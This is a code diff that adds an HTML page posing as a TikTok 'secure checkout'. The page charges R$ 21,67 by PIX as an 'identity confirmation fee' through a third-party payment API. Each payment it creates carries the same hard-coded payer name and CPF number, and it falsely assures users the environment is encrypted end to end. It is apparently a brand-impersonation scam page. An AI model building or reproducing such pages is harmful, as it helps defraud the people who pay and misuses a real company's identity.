@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout Seguro - TikTok</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+
+        /* Animações */
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .animate-modal { animation: modalFadeIn 0.3s ease-out forwards; }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Loading Spinner */
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none; /* Começa oculto */
+            align-items: center; justify-content: center;
+            z-index: 10000;
+            flex-direction: column;
+        }
+        .loading-overlay.show { display: flex; }
+        
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #fe2b54;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #pix-qrcode-img { image-rendering: pixelated; }
+    </style>
+</head>
+<body class="antialiased text-gray-800">
+
+    <div class="min-h-screen flex flex-col items-center justify-center p-4">
+
+        <div id="checkout-screen" class="w-full max-w-sm bg-white rounded-3xl shadow-xl overflow-hidden">
+            <div class="bg-gray-50 px-6 py-4 border-b border-gray-100 flex items-center justify-between">
+                <span class="font-bold text-lg text-gray-700">Resumo do Pedido</span>
+                <span class="text-xs font-semibold bg-green-100 text-green-600 px-2 py-1 rounded-full">Seguro</span>
+            </div>
+
+            <div class="p-6">
+                <div class="flex items-center gap-4 mb-6">
+                    <div class="w-16 h-16 bg-gray-100 rounded-2xl flex items-center justify-center text-2xl">
+                        🔒
+                    </div>
+                    <div>
+                        <h3 class="font-bold text-gray-900 leading-tight">Confirmação de Identidade</h3>
+                        <p class="text-sm text-gray-500 mt-1">Verificação Única</p>
+                    </div>
+                </div>
+
+                <div class="border-t border-dashed border-gray-200 my-4"></div>
+
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-gray-500 text-sm">Subtotal</span>
+                    <span class="font-semibold text-gray-700">R$ 21,67</span>
+                </div>
+                <div class="flex justify-between items-center mb-6">
+                    <span class="text-gray-900 font-bold text-lg">Total</span>
+                    <span class="text-[#fe2b54] font-extrabold text-2xl">R$ 21,67</span>
+                </div>
+
+                <button id="btn-generate-pix" onclick="handleGenerateClick()" class="w-full bg-[#fe2b54] hover:bg-[#e0264a] text-white font-bold py-4 rounded-xl shadow-lg shadow-red-200 transition-transform active:scale-95 flex items-center justify-center gap-2">
+                    <span>Gerar PIX Agora</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6" />
+                    </svg>
+                </button>
+
+                <p class="text-center text-xs text-gray-400 mt-4">
+                    Ambiente criptografado de ponta a ponta.
+                </p>
+            </div>
+        </div>
+
+
+        <div id="loading-overlay" class="loading-overlay">
+            <div class="spinner mb-4"></div>
+            <p class="text-gray-600 font-medium animate-pulse">Gerando código PIX...</p>
+        </div>
+
+
+        <div id="pix-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
+            <div class="bg-white rounded-3xl shadow-2xl max-w-sm w-full p-6 relative animate-modal text-center">
+                
+                <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-300 hover:text-gray-500 transition p-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+
+                <div class="mb-5 mt-2">
+                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 text-green-500 mb-4 shadow-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-extrabold text-gray-900">Pagamento Gerado!</h3>
+                    <p class="mt-1 text-2xl font-bold text-gray-800" id="pix-value-display">R$ 21,67</p>
+                    <p class="text-xs text-gray-500 mt-1">Expira em: <span id="pix-expiration" class="font-mono font-bold text-gray-700">--:--</span></p>
+                </div>
+
+                <div class="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 mb-5 flex justify-center items-center min-h-[200px]">
+                    <img id="pix-qrcode-img" class="w-48 h-48 object-contain hidden mix-blend-multiply opacity-90" alt="QR Code PIX">
+                    <span id="qr-placeholder" class="text-gray-400 text-sm">Carregando Imagem...</span>
+                </div>
+
+                <div class="space-y-3">
+                    <div class="relative group">
+                        <input type="text" id="pix-copy-paste" readonly class="w-full pl-4 pr-10 py-3.5 bg-gray-100 border-none rounded-xl text-xs font-mono text-gray-600 focus:ring-2 focus:ring-green-500 transition-all cursor-text truncate" onClick="this.select();">
+                        <button type="button" onClick="copyPixCode()" class="absolute right-2 top-1/2 transform -translate-y-1/2 p-2 text-gray-400 hover:text-green-600 transition">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                            </svg>
+                        </button>
+                    </div>
+                    
+                    <button type="button" id="btn-copy-main" onClick="copyPixCode()" class="w-full py-4 bg-green-600 hover:bg-green-700 text-white font-bold rounded-xl shadow-lg shadow-green-200 transition-all flex items-center justify-center gap-2 active:scale-95">
+                        <span id="btn-text">Copiar Código PIX</span>
+                    </button>
+                </div>
+
+                <p class="text-[10px] text-gray-400 mt-5">Após o pagamento, aguarde a confirmação automática.</p>
+            </div>
+        </div>
+
+        <div id="error-toast" class="fixed top-5 left-1/2 transform -translate-x-1/2 bg-red-50 text-red-600 px-6 py-4 rounded-xl shadow-xl hidden z-[60] border border-red-100 flex items-center gap-3">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <div>
+                <strong class="block font-bold text-sm">Algo deu errado</strong>
+                <span class="text-xs" id="error-text">Descrição do erro.</span>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURAÇÕES
+        // ============================================
+        let MISTICPAY_CONFIG = null;
+        let PAYMENT_AMOUNT = 21.67;
+        const PAYER_NAME = 'Cliente TikTok';
+        const PAYER_CPF = '580.506.946-66';
+
+        // Elementos UI
+        const checkoutScreen = document.getElementById('checkout-screen');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const pixModal = document.getElementById('pix-modal');
+        const pixQrcodeImg = document.getElementById('pix-qrcode-img');
+        const qrPlaceholder = document.getElementById('qr-placeholder');
+        const pixCopyPasteInput = document.getElementById('pix-copy-paste');
+        const pixValueDisplay = document.getElementById('pix-value-display');
+        const pixExpirationDisplay = document.getElementById('pix-expiration');
+        const errorToast = document.getElementById('error-toast');
+        const errorText = document.getElementById('error-text');
+
+        // ============================================
+        // FUNÇÕES DE UI
+        // ============================================
+
+        // O usuário CLICOU no botão "Gerar PIX"
+        async function handleGenerateClick() {
+            // Verifica se as configs carregaram
+            if (!MISTICPAY_CONFIG) {
+                // Tenta carregar de novo se falhou antes ou foi rápido demais
+                await loadConfig(); 
+                if(!MISTICPAY_CONFIG) {
+                    showError("Erro de configuração. Verifique o console.");
+                    return;
+                }
+            }
+            
+            // Inicia o processo
+            generatePayment();
+        }
+
+        function showLoading() {
+            loadingOverlay.classList.add('show');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.remove('show');
+        }
+
+        function closeModal() {
+            pixModal.classList.add('hidden');
+            // Opcional: mostrar a tela de checkout de novo ou redirecionar
+        }
+
+        function showError(msg) {
+            errorText.textContent = msg;
+            errorToast.classList.remove('hidden');
+            setTimeout(() => errorToast.classList.add('hidden'), 5000);
+        }
+
+        function formatCurrency(value) {
+            return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value);
+        }
+
+        function calculateExpiration() {
+            const now = new Date();
+            now.setMinutes(now.getMinutes() + 10);
+            return now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+        }
+
+        function copyPixCode() {
+            const copyText = document.getElementById("pix-copy-paste");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            
+            try {
+                navigator.clipboard.writeText(copyText.value);
+            } catch (e) {
+                document.execCommand('copy');
+            }
+            
+            const btn = document.getElementById('btn-copy-main');
+            const btnText = document.getElementById('btn-text');
+            const originalBg = btn.className;
+            
+            btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+            btn.classList.add('bg-gray-800');
+            btnText.textContent = "Copiado!";
+            
+            setTimeout(() => {
+                btn.classList.add('bg-green-600', 'hover:bg-green-700');
+                btn.classList.remove('bg-gray-800');
+                btnText.textContent = "Copiar Código PIX";
+            }, 2000);
+        }
+
+        // ============================================
+        // LÓGICA DE API
+        // ============================================
+
+        async function loadConfig() {
+            try {
+                const response = await fetch('config.json');
+                if (!response.ok) throw new Error();
+                const config = await response.json();
+                
+                let proxyUrl = config.misticpay.proxyUrl || '';
+                if (config.misticpay.useProxy && (!proxyUrl || proxyUrl.includes('localhost'))) {
+                    proxyUrl = `${window.location.origin}/api/create-transaction`;
+                }
+                
+                MISTICPAY_CONFIG = {
+                    clientId: config.misticpay.clientId,
+                    clientSecret: config.misticpay.clientSecret,
+                    apiBaseUrl: config.misticpay.apiBaseUrl || 'https://api.misticpay.com/api',
+                    useProxy: config.misticpay.useProxy || false,
+                    proxyUrl: proxyUrl
+                };
+                
+                PAYMENT_AMOUNT = config.payment?.amount || 21.67;
+                console.log('Configurações carregadas (Aguardando clique).');
+                
+            } catch (error) {
+                console.error("Erro ao carregar config.json", error);
+                // Não mostramos erro visual ainda, pois o usuário nem clicou
+            }
+        }
+
+        // Função principal chamada pelo botão
+        async function generatePayment() {
+            showLoading();
+            
+            try {
+                const transactionData = await createPaymentTransaction(PAYER_NAME, PAYER_CPF);
+
+                if (transactionData && transactionData.data) {
+                    const { qrCodeBase64, copyPaste, qrcodeUrl } = transactionData.data;
+
+                    pixValueDisplay.textContent = formatCurrency(PAYMENT_AMOUNT);
+                    pixExpirationDisplay.textContent = calculateExpiration();
+
+                    if (qrCodeBase64) {
+                        pixQrcodeImg.src = qrCodeBase64.startsWith('data:image') ? qrCodeBase64 : `data:image/png;base64,${qrCodeBase64}`;
+                        pixQrcodeImg.classList.remove('hidden');
+                        qrPlaceholder.classList.add('hidden');
+                    } else if (qrcodeUrl) {
+                        pixQrcodeImg.src = qrcodeUrl;
+                        pixQrcodeImg.classList.remove('hidden');
+                        qrPlaceholder.classList.add('hidden');
+                    }
+
+                    if (copyPaste) pixCopyPasteInput.value = copyPaste;
+
+                    // Esconde checkout, mostra modal
+                    pixModal.classList.remove('hidden');
+                    
+                } else {
+                    throw new Error('Dados inválidos da API');
+                }
+            } catch (error) {
+                console.error(error);
+                let msg = error.message;
+                if(msg.includes('Failed to fetch')) msg = "Erro de conexão (CORS/Network).";
+                showError(msg);
+            } finally {
+                hideLoading();
+            }
+        }
+
+async function createPaymentTransaction(name, cpf) {
+            // Limpa o CPF visualmente apenas para envio limpo se necessário
+            const cleanDoc = cpf.replace(/\D/g, '');
+            
+            // Nota: O valor e a descrição agora são forçados pelo server.js
+            // baseado no config.json para garantir que seja a taxa correta.
+            const payload = {
+                payerName: name,
+                payerDocument: cleanDoc
+            };
+
+            let url = `${MISTICPAY_CONFIG.apiBaseUrl}/transactions/create`;
+            let headers = { 'Content-Type': 'application/json' };
+            let body = payload;
+
+            // Sempre usará o proxy configurado no config.json
+            if (MISTICPAY_CONFIG.useProxy && MISTICPAY_CONFIG.proxyUrl) {
+                url = MISTICPAY_CONFIG.proxyUrl;
+                // No modo proxy, o server.js injeta as credenciais e o valor da taxa
+            } else {
+                // Caso use direto (não recomendado para produção)
+                headers['ci'] = MISTICPAY_CONFIG.clientId;
+                headers['cs'] = MISTICPAY_CONFIG.clientSecret;
+                // Se for direto, precisa enviar o valor daqui
+                body.amount = PAYMENT_AMOUNT;
+                body.description = "Taxa de Confirmacao de Identidade";
+                body.transactionId = 'txn_' + Date.now();
+            }
+
+            const res = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
+            
+            if (!res.ok) {
+                const errText = await res.text();
+                throw new Error(`Erro API: ${res.status} - ${errText}`);
+            }
+            return await res.json();
+        }
+
+        // Carrega configs ao abrir a página (mas não gera pagamento)
+        loadConfig();
+
+    </script>
+</body>
+</html>
